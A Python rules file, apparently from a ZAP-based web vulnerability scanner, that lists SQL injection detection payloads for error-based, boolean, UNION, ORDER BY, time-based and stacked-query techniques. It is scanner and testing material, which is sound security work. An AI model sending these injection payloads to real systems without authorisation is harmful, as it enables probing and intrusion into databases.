from __future__ import annotations

# time-based SQLi 지연 시간(초). ZAP send_request 내부 timeout을 넘기면 요청이 에러나므로 짧게 유지.
# 값 변경 시 analyzer/sqli/judge.py 의 SLEEP_THRESHOLD(= _SLEEP - 0.5 권장)도 같이 맞출 것.
_SLEEP = 3


# {value}는 파라미터 원본값 자리표시
_BOOLEAN_AND_FALSE_TEMPLATES = [
    "{value} AND 1=2 -- ",
    "{value}' AND '1'='2' -- ",
    '{value}" AND "1"="2" -- ',
    "{value} AND 1=2",
    "{value}' AND '1'='2",
    '{value}" AND "1"="2"',
    "{value}XYZABCDEFGHIJ",
    "{value}XYZABCDEFGHIJ' -- ",
    '{value}XYZABCDEFGHIJ" -- ',
]

SQLI_RULES: list[dict] = [
    {
        "attack_id": "PL-SQLI-ERROR-META",
        "vuln_type": "sqli",
        "technique": "error_meta",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value}'",
                '{value}"',
                "{value};",
                "{value}NULL",
                "{value}'(",
                "{value})",
                "{value}(",
                "{value}'\"",
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-BOOLEAN-AND",
        "vuln_type": "sqli",
        "technique": "boolean_and",
        "sequence": ["baseline", "true_attack", "false_attack"],
        "payload_templates": {
            "true_attack": [
                "{value} AND 1=1 -- ",
                "{value}' AND '1'='1' -- ",
                '{value}" AND "1"="1" -- ',
                "{value} AND 1=1",
                "{value}' AND '1'='1",
                '{value}" AND "1"="1"',
                "{value}%",
                "{value}%' -- ",
                '{value}%" -- ',
            ],
            "false_attack": _BOOLEAN_AND_FALSE_TEMPLATES,
        },
    },
    {
        "attack_id": "PL-SQLI-BOOLEAN-OR",
        "vuln_type": "sqli",
        "technique": "boolean_or",
        "sequence": ["baseline", "true_attack", "false_attack"],
        "payload_templates": {
            # OR-true vs AND-false 비교 — AND로 차이가 안 보일 때 조건 범위를 넓혀 재확인
            "true_attack": [
                "{value} OR 1=1 -- ",
                "{value}' OR '1'='1' -- ",
                '{value}" OR "1"="1" -- ',
                "{value} OR 1=1",
                "{value}' OR '1'='1",
                '{value}" OR "1"="1"',
                "{value}%",
                "{value}%' -- ",
                '{value}%" -- ',
            ],
            "false_attack": _BOOLEAN_AND_FALSE_TEMPLATES,
        },
    },
    {
        "attack_id": "PL-SQLI-UNION",
        "vuln_type": "sqli",
        "technique": "union",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value} UNION ALL SELECT NULL -- ",
                "{value}' UNION ALL SELECT NULL -- ",
                '{value}" UNION ALL SELECT NULL -- ',
                "{value}) UNION ALL SELECT NULL -- ",
                "{value}') UNION ALL SELECT NULL -- ",
                '{value}") UNION ALL SELECT NULL -- ',
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-ORDERBY",
        "vuln_type": "sqli",
        "technique": "order_by",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                "{value} ASC -- ",
                "{value} DESC -- ",
                "{value} 1 ASC -- ",
                "{value} 1 DESC -- ",
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-TIME-MYSQL",
        "vuln_type": "sqli",
        "technique": "time_mysql",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                f"{{value}} / sleep({_SLEEP}) ",
                f"{{value}}' / sleep({_SLEEP}) / '",
                f'{{value}}" / sleep({_SLEEP}) / "',
                f"{{value}} AND 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' AND 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" AND 0 IN (SELECT sleep({_SLEEP}) ) -- ',
                f"{{value}} WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" WHERE 0 IN (SELECT sleep({_SLEEP}) ) -- ',
                f"{{value}} OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f"{{value}}' OR 0 IN (SELECT sleep({_SLEEP}) ) -- ",
                f'{{value}}" OR 0 IN (SELECT sleep({_SLEEP}) ) -- ',
            ],
        },
    },
    {
        "attack_id": "PL-SQLI-STACKED",
        "vuln_type": "sqli",
        "technique": "stacked",
        "sequence": ["baseline", "attack"],
        "payload_templates": {
            "attack": [
                f"{{value}}; SELECT SLEEP({_SLEEP})-- ",
                f"{{value}}'; SELECT SLEEP({_SLEEP})-- ",
                f'{{value}}"; SELECT SLEEP({_SLEEP})-- ',
            ],
        },
    },
]
